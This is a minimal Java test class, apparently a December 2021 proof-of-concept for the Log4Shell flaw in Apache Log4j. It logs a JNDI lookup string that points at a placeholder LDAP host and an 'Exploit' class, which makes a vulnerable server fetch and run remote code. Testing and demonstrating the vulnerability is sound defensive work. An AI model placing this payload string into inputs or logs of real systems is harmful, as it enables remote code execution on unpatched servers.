import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * @author cause
 * @date 2021/12/12
 */
public class Test {

  private static final Logger logger = LogManager.getLogger();
  public static void main(String[] args) {
    logger.error("${jndi:ldap://ip:1389/#Exploit}");
//    logger.error("Exploit");
  }

}
